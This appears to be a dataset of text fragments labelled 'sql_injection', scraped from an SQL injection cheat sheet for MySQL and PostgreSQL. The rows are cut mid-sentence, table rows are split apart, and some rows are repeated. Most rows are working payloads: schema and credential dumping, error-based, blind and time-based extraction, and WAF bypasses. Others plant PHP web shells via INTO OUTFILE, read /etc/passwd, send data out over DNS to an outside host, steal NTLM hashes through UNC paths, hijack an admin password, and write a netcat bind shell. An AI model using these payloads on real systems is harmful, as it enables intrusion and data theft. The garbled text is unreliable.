"(select(@)from(select(@:=0x00),(select(@)from(information_schema.columns)where(@)in(@:=concat(@,0x3C62723E,table_name,0x3a,column_name))))a)",sql_injection
* Dr.Z3r0,sql_injection
"(select(select concat(@:=0xa7,(select count(*)from(information_schema.columns)where(@:=concat(@,0x3c6c693e,table_name,0x3a,column_name))),@))",sql_injection
* M@dBl00d,sql_injection
"(Select export_set(5,@:=0,(select count(*)from(information_schema.columns)where@:=export_set(5,export_set(5,@,table_name,0x3c6c693e,2),column_name,0xa3a,2)),@,2))",sql_injection
* Zen,sql_injection
"+make_set(6,@:=0x0a,(select(1)from(information_schema.columns)where@:=make_set(511,@,0x3c6c693e,table_name,column_name)),@)",sql_injection
* sharik,sql_injection
"(select(@a)from(select(@a:=0x00),(select(@a)from(information_schema.columns)where(table_schema!=0x696e666f726d6174696f6e5f736368656d61)and(@a)in(@a:=concat(@a,table_name,0x203a3a20,column_name,0x3c62723e))))a)",sql_injection
`INFORMATION_SCHEMA.PROCESSLIST` is a special table available in MySQL and MariaDB that provides information about active processes and threads within the database server. This table can list all operations that DB is performing at the moment.,sql_injection
"The `PROCESSLIST` table contains several important columns, each providing details about the current processes. Common columns include:",sql_injection
* **ID** : The process identifier.,sql_injection
* **USER** : The MySQL user who is running the process.,sql_injection
* **HOST** : The host from which the process was initiated.,sql_injection
"* **DB** : The database the process is currently accessing, if any.",sql_injection
"* **COMMAND** : The type of command the process is executing (e.g., Query, Sleep).",sql_injection
* **TIME** : The time in seconds that the process has been running.,sql_injection
* **STATE** : The current state of the process.,sql_injection
"* **INFO** : The text of the statement being executed, or NULL if no statement is being executed.",sql_injection
| ID  | USER      | HOST           | DB     | COMMAND | TIME | STATE      | INFO |,sql_injection
| --- | --------- | ---------------- | ------- | ------- | ---- | ---------- | ---- |,sql_injection
| 1   | root   | localhost        | testdb  | Query  | 10 | executing  | SELECT * FROM some_table |,sql_injection
| 2   | app_uset  | 192.168.0.101    | appdb   | Sleep  | 300 | sleeping  | NULL |,sql_injection
| 3   | gues_user | example.com:3360 | NULL    | Connect | 0    | connecting | NULL |,sql_injection
Dump in one shot query to extract the whole content of the table.,sql_injection
"Need the `filepriv`, otherwise you will get the error : `ERROR 1290 (HY000): The MySQL server is running with the --secure-file-priv option so it cannot execute this statement`",sql_injection
"If you are `root` on the database, you can re-enable the `LOAD_FILE` using the following query",sql_injection
First you need to check if the UDF are installed on the server.,sql_injection
Then you can use functions such as `sys_exec` and `sys_eval`.,sql_injection
`ON DUPLICATE KEY UPDATE` keywords is used to tell MySQL what to do when the application tries to insert a row that already exists in the table. We can use this to change the admin password by:,sql_injection
Inject using payload:,sql_injection
The query would look like this:,sql_injection
"This query will insert a row for the user ""`attacker_dummy@example.com`"". It will also insert a row for the user ""`admin@example.com`"".",sql_injection
"Because this row already exists, the `ON DUPLICATE KEY UPDATE` keyword tells MySQL to update the `password` column of the already existing row to ""P@ssw0rd"". After this, we can simply authenticate with ""`admin@example.com`"" and the password ""P@ssw0rd"".",sql_injection
"In MYSQL ""`admin`"" and ""`admin`"" are the same. If the username column in the database has a character-limit the rest of the characters are truncated. So if the database has a column-limit of 20 characters and we input a string with 21 characters the last 1 character will be removed.",sql_injection
"Payload: `username = ""admin               a""`",sql_injection
"The term ""UNC path"" refers to the Universal Naming Convention path used to specify the location of resources such as shared files or devices on a network. It is commonly used in Windows environments to access files over a network using a format like `\\server\share\file`.",sql_injection
:warning: Don't forget to escape the '\\\\'.,sql_injection
`information_schema.tables` alternative,sql_injection
Requirement: `MySQL >= 5.7.22`,sql_injection
Use `json_arrayagg()` instead of `group_concat()` which allows less symbols to be displayed,sql_injection
* `group_concat()` = 1024 symbols,sql_injection
"* `json_arrayagg()` > 16,000,000 symbols",sql_injection
"In MySQL, the e notation is used to represent numbers in scientific notation. It's a way to express very large or very small numbers in a concise format. The e notation consists of a number followed by the letter e and an exponent.",sql_injection
The format is: `base 'e' exponent`.,sql_injection
For example:,sql_injection
* `1e3` represents `1 x 10^3` which is `1000`.,sql_injection
* `1.5e3` represents `1.5 x 10^3` which is `1500`.,sql_injection
* `2e-3` represents `2 x 10^-3` which is `0.002`.,sql_injection
The following queries are equivalent:,sql_injection
* `SELECT table_name FROM information_schema 1.e.tables`,sql_injection
* `SELECT table_name FROM information_schema .tables`,sql_injection
"In the same way, the common payload to bypass authentication `' or ''='` is equivalent to `' or 1.e('')='` and `1' or 1.e(1) or '1'='1`.",sql_injection
"This technique can be used to obfuscate queries to bypass WAF, for example: `1.e(ascii 1.e(substring(1.e(select password from users limit 1 1.e,1 1.e) 1.e,1 1.e,1 1.e)1.e)1.e) = 70 or'1'='2`",sql_injection
MySQL conditional comments are enclosed within `/*! ... */` and can include a version number to specify the minimum version of MySQL that should execute the contained code.,sql_injection
"The code inside this comment will be executed only if the MySQL version is greater than or equal to the number immediately following the `/*!`. If the MySQL version is less than the specified number, the code inside the comment will be ignored.",sql_injection
* `/*!12345UNION*/`: This means that the word UNION will be executed as part of the SQL statement if the MySQL version is 12.345 or higher.,sql_injection
"* `/*!31337SELECT*/`: Similarly, the word SELECT will be executed if the MySQL version is 31.337 or higher.",sql_injection
"**Examples**: `/*!12345UNION*/`, `/*!31337SELECT*/`",sql_injection
"Wide byte injection is a specific type of SQL injection attack that targets applications using multi-byte character sets, like GBK or SJIS. The term ""wide byte"" refers to character encodings where one character can be represented by more than one byte. This type of injection is particularly relevant when the application and the database interpret multi-byte sequences differently.",sql_injection
"The `SET NAMES gbk` query can be exploited in a charset-based SQL injection attack. When the character set is set to GBK, certain multibyte characters can be used to bypass the escaping mechanism and inject malicious SQL code.",sql_injection
Several characters can be used to trigger the injection.,sql_injection
"* `%bf%27`: This is a URL-encoded representation of the byte sequence `0xbf27`. In the GBK character set, `0xbf27` decodes to a valid multibyte character followed by a single quote ('). When MySQL encounters this sequence, it interprets it as a single valid GBK character followed by a single quote, effectively ending the string.",sql_injection
"* `%bf%5c`: Represents the byte sequence `0xbf5c`. In GBK, this decodes to a valid multi-byte character followed by a backslash (`\`). This can be used to escape the next character in the sequence.",sql_injection
"* `%a1%27`: Represents the byte sequence `0xa127`. In GBK, this decodes to a valid multi-byte character followed by a single quote (`'`).",sql_injection
A lot of payloads can be created such as:,sql_injection
"Here is a PHP example using GBK encoding and filtering the user input to escape backslash, single and double quote.",sql_injection
"                         | Backtick                          |

## MYSQL Testing Injection

* **Strings**: Query like ",sql_injection
"ps1
    ' False
    '' True
    "" False
    """" True
    \ False
    \\ True
    ",sql_injection
"ps1
    ' OR '1
    ' OR 1 -- -
    "" OR """" = ""
    "" OR 1 = 1 -- -
    '='
    'LIKE'
    '=0--+
    ",sql_injection
"sql
UNION SELECT NULL;--
UNION SELECT NULL, NULL;-- 
UNION SELECT NULL, NULL, NULL;-- 
",sql_injection
" have different functionality in SQL, they both can be used in the exact same fashion to determine the number of columns in the query.

| ORDER BY        | GROUP BY        | Result |
| --------------- | --------------- | ------ |
| ",sql_injection
" | True   |
| ",sql_injection
" | False  |

Since the result is false for ",sql_injection
"sql
ORDER BY 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100--+ # Unknown column '4' in 'order clause'
",sql_injection
"

#### LIMIT INTO Method

This method is effective when error reporting is enabled. It can help determine the number of columns in cases where the injection point occurs after a LIMIT clause.

| Payload                      | Error           |
| ---------------------------- | --------------- |
| ",sql_injection
" |

Since the result doesn't show any error it means the query uses 3 columns: ",sql_injection
".

| Payload | Output |
| --- | --- |
| ",sql_injection
" | Operand should contain **4** column(s) |
| ",sql_injection
" | Column '**id**' cannot be null |

Method for ",sql_injection
"

| Payload | Output |
| --- | --- |
| ",sql_injection
" | Duplicate column name '**id**' |
| ",sql_injection
" | Duplicate column name '**name**' |
| ",sql_injection
" | Data |

### Extract Data Without Columns Name

Extracting data from the 4th column without knowing its name.

",sql_injection
" FROM (SELECT 1,2,3,4,5,6 UNION SELECT * FROM USERS)DBNAME;
",sql_injection
"sql
MariaDB [dummydb]> SELECT AUTHOR_ID,TITLE FROM POSTS WHERE AUTHOR_ID=-1 UNION SELECT 1,(SELECT CONCAT(",sql_injection
") FROM (SELECT 1,2,3,4,5,6 UNION SELECT * FROM USERS)A LIMIT 1,1);
+-----------+-----------------------------------------------------------------+
| author_id | title                                                           |
+-----------+-----------------------------------------------------------------+
|         1 | a45d4e080fc185dfa223aea3d0c371b6cc180a37:veronica80@example.org |
+-----------+-----------------------------------------------------------------+
",sql_injection
"

## MYSQL Error Based

| Name         | Payload         |
| ------------ | --------------- |
| GTID_SUBSET  | ",sql_injection
" |
| JSON_KEYS    | ",sql_injection
" |
| EXTRACTVALUE | ",sql_injection
" |
| UPDATEXML    | ",sql_injection
" |
| EXP          | ",sql_injection
" |
| OR           | ",sql_injection
" |
| NAME_CONST   | ",sql_injection
" |
| UUID_TO_BIN  | ",sql_injection
" |

### MYSQL Error Based - Basic

Works with ",sql_injection
"sql
(SELECT 1 AND ROW(1,1)>(SELECT COUNT(*),CONCAT(CONCAT(@@VERSION),0X3A,FLOOR(RAND()*2))X FROM (SELECT 1 UNION SELECT 2)A GROUP BY X LIMIT 1))
'+(SELECT 1 AND ROW(1,1)>(SELECT COUNT(*),CONCAT(CONCAT(@@VERSION),0X3A,FLOOR(RAND()*2))X FROM (SELECT 1 UNION SELECT 2)A GROUP BY X LIMIT 1))+'
",sql_injection
"sql
AND UPDATEXML(rand(),CONCAT(CHAR(126),version(),CHAR(126)),null)-
AND UPDATEXML(rand(),CONCAT(0x3a,(SELECT CONCAT(CHAR(126),schema_name,CHAR(126)) FROM information_schema.schemata LIMIT data_offset,1)),null)--
AND UPDATEXML(rand(),CONCAT(0x3a,(SELECT CONCAT(CHAR(126),TABLE_NAME,CHAR(126)) FROM information_schema.TABLES WHERE table_schema=data_column LIMIT data_offset,1)),null)--
AND UPDATEXML(rand(),CONCAT(0x3a,(SELECT CONCAT(CHAR(126),column_name,CHAR(126)) FROM information_schema.columns WHERE TABLE_NAME=data_table LIMIT data_offset,1)),null)--
AND UPDATEXML(rand(),CONCAT(0x3a,(SELECT CONCAT(CHAR(126),data_info,CHAR(126)) FROM data_table.data_column LIMIT data_offset,1)),null)--
",sql_injection
"sql
UPDATEXML(null,CONCAT(0x0a,version()),null)-- -
UPDATEXML(null,CONCAT(0x0a,(select table_name from information_schema.tables where table_schema=database() LIMIT 0,1)),null)-- -
",sql_injection
"sql
?id=1 AND EXTRACTVALUE(RAND(),CONCAT(CHAR(126),VERSION(),CHAR(126)))--
?id=1 AND EXTRACTVALUE(RAND(),CONCAT(0X3A,(SELECT CONCAT(CHAR(126),schema_name,CHAR(126)) FROM information_schema.schemata LIMIT data_offset,1)))--
?id=1 AND EXTRACTVALUE(RAND(),CONCAT(0X3A,(SELECT CONCAT(CHAR(126),table_name,CHAR(126)) FROM information_schema.TABLES WHERE table_schema=data_column LIMIT data_offset,1)))--
?id=1 AND EXTRACTVALUE(RAND(),CONCAT(0X3A,(SELECT CONCAT(CHAR(126),column_name,CHAR(126)) FROM information_schema.columns WHERE TABLE_NAME=data_table LIMIT data_offset,1)))--
?id=1 AND EXTRACTVALUE(RAND(),CONCAT(0X3A,(SELECT CONCAT(CHAR(126),data_column,CHAR(126)) FROM data_schema.data_table LIMIT data_offset,1)))--
",sql_injection
"sql
?id=1 AND (SELECT * FROM (SELECT NAME_CONST(version(),1),NAME_CONST(version(),1)) as x)--
?id=1 AND (SELECT * FROM (SELECT NAME_CONST(user(),1),NAME_CONST(user(),1)) as x)--
?id=1 AND (SELECT * FROM (SELECT NAME_CONST(database(),1),NAME_CONST(database(),1)) as x)--
",sql_injection
"

## MYSQL Blind

### MYSQL Blind With Substring Equivalent

| Function | Example | Description |
| --- | --- | --- |
| ",sql_injection
" | Extracts a substring from a string (starting at any position) |
| ",sql_injection
" | Extracts a number of characters from a string (starting from right) |
| ",sql_injection
" | Extracts a number of characters from a string (starting from left) |

Examples of Blind SQL injection using ",sql_injection
"sql
?id=1 AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables > 'A'
?id=1 AND SELECT SUBSTR(column_name,1,1) FROM information_schema.columns > 'A'
?id=1 AND ASCII(LOWER(SUBSTR(version(),1,1)))=51
",sql_injection
"sql
    2100935' OR IF(MID(@@version,1,1)='5',sleep(1),1)='2
    Response:
    HTTP/1.1 500 Internal Server Error
    ",sql_injection
"sql
    2100935' OR IF(MID(@@version,1,1)='4',sleep(1),1)='2
    Response:
    HTTP/1.1 200 OK
    ",sql_injection
"sql
AND MAKE_SET(VALUE_TO_EXTRACT<(SELECT(length(version()))),1)
AND MAKE_SET(VALUE_TO_EXTRACT<ascii(substring(version(),POS,1)),1)
AND MAKE_SET(VALUE_TO_EXTRACT<(SELECT(length(concat(login,password)))),1)
AND MAKE_SET(VALUE_TO_EXTRACT<ascii(substring(concat(login,password),POS,1)),1)
",sql_injection
"): This wildcard represents a single character. It's used for more precise matching when you know the structure of the data but not the specific character at a particular position.

",sql_injection
"sql
SELECT cust_code FROM customer WHERE cust_name LIKE 'k__l';
SELECT * FROM products WHERE product_name LIKE '%user_input%'
",sql_injection
" operator can offer.

| Payload | Description |
| --- | --- |
| ",sql_injection
" | Checking length |
| ",sql_injection
"   | Checking for the presence of digits |
| ",sql_injection
" | Checking for data starting by ""a"" |

## MYSQL Time Based

The following SQL codes will delay the output from MySQL.

* MySQL 4/5 : [",sql_injection
"sql
    +BENCHMARK(40000000,SHA1(1337))+
    '+BENCHMARK(3200,SHA1(1))+'
    AND [RANDNUM]=BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]'))
    ",sql_injection
"sql
1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE '%')#
1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE '___')# 
1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE '____')#
1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE '_____')#
",sql_injection
"sql
1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'A____')#
1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'S____')#
",sql_injection
"sql
1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'SA___')#
1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'SW___')#
",sql_injection
"sql
1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'SWA__')#
1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'SWB__')#
1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'SWI__')#
",sql_injection
"sql
1 AND (SELECT SLEEP(10) FROM DUAL WHERE (SELECT table_name FROM information_schema.columns WHERE table_schema=DATABASE() AND column_name LIKE '%pass%' LIMIT 0,1) LIKE '%')#
",sql_injection
"sql
?id=1 AND IF(ASCII(SUBSTRING((SELECT USER()),1,1))>=100,1, BENCHMARK(2000000,MD5(NOW()))) --
?id=1 AND IF(ASCII(SUBSTRING((SELECT USER()), 1, 1))>=100, 1, SLEEP(3)) --
?id=1 OR IF(MID(@@version,1,1)='5',sleep(1),1)='2
",sql_injection
"sql
(select (@) from (select(@:=0x00),(select (@) from (information_schema.columns) where (table_schema>=@) and (@)in (@:=concat(@,0x0D,0x0A,' [ ',table_schema,' ] > ',table_name,' > ',column_name,0x7C))))a)#
(select (@) from (select(@:=0x00),(select (@) from (db_data.table_data) where (@)in (@:=concat(@,0x0D,0x0A,0x7C,' [ ',column_data1,' ] > ',column_data2,' > ',0x7C))))a)#
",sql_injection
"sql
SELECT * FROM INFORMATION_SCHEMA.PROCESSLIST;
",sql_injection
"

| ID  | USER      | HOST           | DB     | COMMAND | TIME | STATE      | INFO |
| --- | --------- | ---------------- | ------- | ------- | ---- | ---------- | ---- |
| 1   | root   | localhost        | testdb  | Query  | 10 | executing  | SELECT * FROM some_table |
| 2   | app_uset  | 192.168.0.101    | appdb   | Sleep  | 300 | sleeping  | NULL |
| 3   | gues_user | example.com:3360 | NULL    | Connect | 0    | connecting | NULL |

",sql_injection
"sql
UNION ALL SELECT LOAD_FILE('/etc/passwd') --
UNION ALL SELECT TO_base64(LOAD_FILE('/var/www/html/index.php'));
",sql_injection
"sql
GRANT FILE ON *.* TO 'root'@'localhost'; FLUSH PRIVILEGES;#
",sql_injection
"sql
[...] UNION SELECT ""<?php system($_GET['cmd']); ?>"" into outfile ""C:\\xampp\\htdocs\\backdoor.php""
[...] UNION SELECT '' INTO OUTFILE '/var/www/html/x.php' FIELDS TERMINATED BY '<?php phpinfo();?>'
[...] UNION SELECT 1,2,3,4,5,0x3c3f70687020706870696e666f28293b203f3e into outfile 'C:\\wamp\\www\\pwnd.php'-- -
[...] union all select 1,2,3,4,""<?php echo shell_exec($_GET['cmd']);?>"",6 into OUTFILE 'c:/inetpub/wwwroot/backdoor.php'
",sql_injection
"sql
[...] UNION SELECT 0xPHP_PAYLOAD_IN_HEX, NULL, NULL INTO DUMPFILE 'C:/Program Files/EasyPHP-12.1/www/shell.php'
[...] UNION SELECT 0x3c3f7068702073797374656d28245f4745545b2763275d293b203f3e INTO DUMPFILE '/var/www/html/images/shell.php';
",sql_injection
"sql
$ mysql -u root -p mysql
Enter password: [...]

mysql> SELECT sys_eval('id');
+--------------------------------------------------+
| sys_eval('id') |
+--------------------------------------------------+
| uid=118(mysql) gid=128(mysql) groups=128(mysql) |
+--------------------------------------------------+
",sql_injection
"sql
attacker_dummy@example.com"", ""P@ssw0rd""), (""admin@example.com"", ""P@ssw0rd"") ON DUPLICATE KEY UPDATE password=""P@ssw0rd"" --
",sql_injection
"sql
INSERT INTO users (email, password) VALUES (""attacker_dummy@example.com"", ""BCRYPT_HASH""), (""admin@example.com"", ""P@ssw0rd"") ON DUPLICATE KEY UPDATE password=""P@ssw0rd"" -- "", ""BCRYPT_HASH_OF_YOUR_PASSWORD_INPUT"");
",sql_injection
"

This query will insert a row for the user """,sql_injection
""". It will also insert a row for the user """,sql_injection
""".

Because this row already exists, the ",sql_injection
" column of the already existing row to ""P@ssw0rd"". After this, we can simply authenticate with """,sql_injection
""" and the password ""P@ssw0rd"".

## MYSQL Truncation

In MYSQL """,sql_injection
""" and """,sql_injection
""" are the same. If the username column in the database has a character-limit the rest of the characters are truncated. So if the database has a column-limit of 20 characters and we input a string with 21 characters the last 1 character will be removed.

",sql_injection
"powershell
SELECT @@version INTO OUTFILE '\\\\192.168.0.100\\temp\\out.txt';
SELECT @@version INTO DUMPFILE '\\\\192.168.0.100\\temp\\out.txt;
",sql_injection
"sql
SELECT LOAD_FILE(CONCAT('\\\\',VERSION(),'.hacker.site\\a.txt'));
SELECT LOAD_FILE(CONCAT(0x5c5c5c5c,VERSION(),0x2e6861636b65722e736974655c5c612e747874))
",sql_injection
"

### UNC Path - NTLM Hash Stealing

The term ""UNC path"" refers to the Universal Naming Convention path used to specify the location of resources such as shared files or devices on a network. It is commonly used in Windows environments to access files over a network using a format like ",sql_injection
"sql
SELECT LOAD_FILE('\\\\error\\abc');
SELECT LOAD_FILE(0x5c5c5c5c6572726f725c5c616263);
SELECT '' INTO DUMPFILE '\\\\error\\abc';
SELECT '' INTO OUTFILE '\\\\error\\abc';
LOAD DATA INFILE '\\\\error\\abc' INTO TABLE DATABASE.TABLE_NAME;
",sql_injection
"

:warning: Don't forget to escape the '\\\\'.

## MYSQL WAF Bypass

### Alternative to Information Schema

",sql_injection
"sql
SELECT * FROM mysql.innodb_table_stats;
+----------------+-----------------------+---------------------+--------+----------------------+--------------------------+
| database_name  | table_name            | last_update         | n_rows | clustered_index_size | sum_of_other_index_sizes |
+----------------+-----------------------+---------------------+--------+----------------------+--------------------------+
| dvwa           | guestbook             | 2017-01-19 21:02:57 |      0 |                    1 |                        0 |
| dvwa           | users                 | 2017-01-19 21:03:07 |      5 |                    1 |                        0 |
...
+----------------+-----------------------+---------------------+--------+----------------------+--------------------------+

mysql> SHOW TABLES IN dvwa;
+----------------+
| Tables_in_dvwa |
+----------------+
| guestbook      |
| users          |
+----------------+
",sql_injection
"sql
mysql> SELECT @@innodb_version;
+------------------+
| @@innodb_version |
+------------------+
| 5.6.31           |
+------------------+

mysql> SELECT @@version;
+-------------------------+
| @@version               |
+-------------------------+
| 5.6.31-0ubuntu0.15.10.1 |
+-------------------------+

mysql> SELECT version();
+-------------------------+
| version()               |
+-------------------------+
| 5.6.31-0ubuntu0.15.10.1 |
+-------------------------+

mysql> SELECT @@GLOBAL.VERSION;
+------------------+
| @@GLOBAL.VERSION |
+------------------+
| 8.0.27           |
+------------------+
",sql_injection
" > 16,000,000 symbols

",sql_injection
"sql
SELECT json_arrayagg(concat_ws(0x3a,table_schema,table_name)) from INFORMATION_SCHEMA.TABLES;
",sql_injection
"

### Scientific Notation

In MySQL, the e notation is used to represent numbers in scientific notation. It's a way to express very large or very small numbers in a concise format. The e notation consists of a number followed by the letter e and an exponent.
The format is: ",sql_injection
"

### Wide Byte Injection (GBK)

Wide byte injection is a specific type of SQL injection attack that targets applications using multi-byte character sets, like GBK or SJIS. The term ""wide byte"" refers to character encodings where one character can be represented by more than one byte. This type of injection is particularly relevant when the application and the database interpret multi-byte sequences differently.

The ",sql_injection
" decodes to a valid multibyte character followed by a single quote ('). When MySQL encounters this sequence, it interprets it as a single valid GBK character followed by a single quote, effectively ending the string.
* ",sql_injection
"sql
%A8%27 OR 1=1;--
%8C%A8%27 OR 1=1--
%bf' OR 1=1 -- --
",sql_injection
"php
function check_addslashes($string)
{
    $string = preg_replace('/'. preg_quote('\\') .'/', ""\\\\\\"", $string);          //escape any backslash
    $string = preg_replace('/\'/i', '\\\'', $string);                               //escape single quote with a backslash
    $string = preg_replace('/\""/', ""\\\"""", $string);                                //escape double quote with a backslash
      
    return $string;
}

$id=check_addslashes($_GET['id']);
mysql_query(""SET NAMES gbk"");
$sql=""SELECT * FROM users WHERE id='$id' LIMIT 0,1"";
print_r(mysql_error());
",sql_injection
"

Here's a breakdown of how the wide byte injection works:

For instance, if the input is ",sql_injection
" effectively ""eating"" the added escape character, allowing for SQL injection.

Therefore, by using the payload ",sql_injection
CAST(chr(126)||VERSION()||chr(126) AS NUMERIC),sql_injection
CAST(chr(126)||(SELECT table_name FROM information_schema.tables LIMIT 1 offset data_offset)||chr(126) AS NUMERIC)--,sql_injection
CAST(chr(126)||(SELECT column_name FROM information_schema.columns WHERE table_name='data_table' LIMIT 1 OFFSET data_offset)||chr(126) AS NUMERIC)--,sql_injection
CAST(chr(126)||(SELECT data_column FROM data_table LIMIT 1 offset data_offset)||chr(126) AS NUMERIC),sql_injection
"' and 1=cast((SELECT concat('DATABASE: ',current_database())) as int) and '1'='1",sql_injection
' and 1=cast((SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET data_offset) as int) and '1'='1,sql_injection
' and 1=cast((SELECT column_name FROM information_schema.columns WHERE table_name='data_table' LIMIT 1 OFFSET data_offset) as int) and '1'='1,sql_injection
' and 1=cast((SELECT data_column FROM data_table LIMIT 1 OFFSET data_offset) as int) and '1'='1,sql_injection
"SELECT query_to_xml('select * from pg_user',true,true,''); -- returns all the results as a single xml row",sql_injection
"SELECT database_to_xml(true,true,''); -- dump the current database to XML",sql_injection
"SELECT database_to_xmlschema(true,true,''); -- dump the current db to an XML schema",sql_injection
"' and substr(version(),1,10) = 'PostgreSQL' and '1  -- TRUE",sql_injection
"' and substr(version(),1,10) = 'PostgreXXX' and '1  -- FALSE",sql_injection
select 1 from pg_sleep(5),sql_injection
;(select 1 from pg_sleep(5)),sql_injection
||(select 1 from pg_sleep(5)),sql_injection
"select case when substring(datname,1,1)='1' then pg_sleep(5) else pg_sleep(0) end from pg_database limit 1",sql_injection
"select case when substring(table_name,1,1)='a' then pg_sleep(5) else pg_sleep(0) end from information_schema.tables limit 1",sql_injection
"select case when substring(column,1,1)='1' then pg_sleep(5) else pg_sleep(0) end from table_name limit 1",sql_injection
"select case when substring(column,1,1)='1' then pg_sleep(5) else pg_sleep(0) end from table_name where column_name='value' limit 1",sql_injection
AND 'RANDSTR'||PG_SLEEP(10)='RANDSTR',sql_injection
AND [RANDNUM]=(SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME])),sql_injection
"AND [RANDNUM]=(SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000))",sql_injection
declare c text;,sql_injection
declare p text;,sql_injection
begin,sql_injection
SELECT into p (SELECT YOUR-QUERY-HERE);,sql_injection
c := 'copy (SELECT '''') to program ''nslookup '||p||'.BURP-COLLABORATOR-SUBDOMAIN''';,sql_injection
execute c;,sql_injection
END;,sql_injection
$$ language plpgsql security definer;,sql_injection
SELECT f();,sql_injection
SELECT 1;CREATE TABLE NOTSOSECURE (DATA VARCHAR(200));--,sql_injection
select pg_ls_dir('./');,sql_injection
"select pg_read_file('PG_VERSION', 0, 200);",sql_injection
* Using `COPY`,sql_injection
CREATE TABLE temp(t TEXT);,sql_injection
COPY temp FROM '/etc/passwd';,sql_injection
SELECT * FROM temp limit 1 offset 0;,sql_injection
* Using `lo_import`,sql_injection
SELECT lo_import('/etc/passwd'); -- will create a large object from the file and return the OID,sql_injection
SELECT lo_get(16420); -- use the OID returned from the above,sql_injection
SELECT * from pg_largeobject; -- or just get all the large objects and their data,sql_injection
CREATE TABLE nc (t TEXT);,sql_injection
INSERT INTO nc(t) VALUES('nc -lvvp 2346 -e /bin/bash');,sql_injection
SELECT * FROM nc;,sql_injection
COPY nc(t) TO '/tmp/nc.sh';,sql_injection
* Using `COPY` (one-line),sql_injection
COPY (SELECT 'nc -lvvp 2346 -e /bin/bash') TO '/tmp/pentestlab';,sql_injection
"* Using `lo_from_bytea`, `lo_put` and `lo_export`",sql_injection
"SELECT lo_from_bytea(43210, 'your file data goes in here'); -- create a large object with OID 43210 and some data",sql_injection
"SELECT lo_put(43210, 20, 'some other data'); -- append data to a large object at offset 20",sql_injection
"SELECT lo_export(43210, '/tmp/testexport'); -- export data to /tmp/testexport",sql_injection
Installations running Postgres 9.3 and above have functionality which allows for the superuser and users with '`pg_execute_server_program`' to pipe to and from an external program using `COPY`.,sql_injection
| Payload            | Technique |,sql_injection
| ------------------ | --------- |,sql_injection
| `SELECT CHR(65)\|\|CHR(66)\|\|CHR(67);` | String from `CHR()` |,sql_injection
| `SELECT $TAG$This` | Dollar-sign ( >= version 8 PostgreSQL)   |,sql_injection
"Retrieve all table-level privileges for the current user, excluding tables in system schemas like `pg_catalog` and `information_schema`.",sql_injection
SELECT user;,sql_injection
SELECT current_user;,sql_injection
SELECT session_user;,sql_injection
SELECT usename FROM pg_user;,sql_injection
SELECT getpgusername();,sql_injection
SELECT table_name FROM information_schema.tables WHERE table_schema='<SCHEMA_NAME>',sql_injection
SELECT tablename FROM pg_tables WHERE schemaname = '<SCHEMA_NAME>',sql_injection
SELECT column_name FROM information_schema.columns WHERE table_name='data_table',sql_injection
AND 1337=CAST('~'\|\|(SELECT version())::text\|\|'~' AS NUMERIC) -- -,sql_injection
AND (CAST('~'\|\|(SELECT version())::text\|\|'~' AS NUMERIC)) -- -,sql_injection
AND CAST((SELECT version()) AS INT)=1337 -- -,sql_injection
AND (SELECT version())::int=1 -- -,sql_injection
"sql
CAST(chr(126)||VERSION()||chr(126) AS NUMERIC)
CAST(chr(126)||(SELECT table_name FROM information_schema.tables LIMIT 1 offset data_offset)||chr(126) AS NUMERIC)--
CAST(chr(126)||(SELECT column_name FROM information_schema.columns WHERE table_name='data_table' LIMIT 1 OFFSET data_offset)||chr(126) AS NUMERIC)--
CAST(chr(126)||(SELECT data_column FROM data_table LIMIT 1 offset data_offset)||chr(126) AS NUMERIC)
",sql_injection
"sql
' and 1=cast((SELECT concat('DATABASE: ',current_database())) as int) and '1'='1
' and 1=cast((SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET data_offset) as int) and '1'='1
' and 1=cast((SELECT column_name FROM information_schema.columns WHERE table_name='data_table' LIMIT 1 OFFSET data_offset) as int) and '1'='1
' and 1=cast((SELECT data_column FROM data_table LIMIT 1 OFFSET data_offset) as int) and '1'='1
",sql_injection
"sql
SELECT query_to_xml('select * from pg_user',true,true,''); -- returns all the results as a single xml row
",sql_injection
"sql
SELECT database_to_xml(true,true,''); -- dump the current database to XML
SELECT database_to_xmlschema(true,true,''); -- dump the current db to an XML schema
",sql_injection
"

Note, with the above queries, the output needs to be assembled in memory. For larger databases, this might cause a slow down or denial of service condition.

## PostgreSQL Blind

### PostgreSQL Blind With Substring Equivalent

| Function    | Example                                         |
| ----------- | ----------------------------------------------- |
| ",sql_injection
"           |
| ",sql_injection
"        |
| ",sql_injection
" |

Examples:

",sql_injection
"sql
' and substr(version(),1,10) = 'PostgreSQL' and '1  -- TRUE
' and substr(version(),1,10) = 'PostgreXXX' and '1  -- FALSE
",sql_injection
"sql
select 1 from pg_sleep(5)
;(select 1 from pg_sleep(5))
||(select 1 from pg_sleep(5))
",sql_injection
"sql
select case when substring(datname,1,1)='1' then pg_sleep(5) else pg_sleep(0) end from pg_database limit 1
",sql_injection
"sql
select case when substring(table_name,1,1)='a' then pg_sleep(5) else pg_sleep(0) end from information_schema.tables limit 1
",sql_injection
"sql
select case when substring(column,1,1)='1' then pg_sleep(5) else pg_sleep(0) end from table_name limit 1
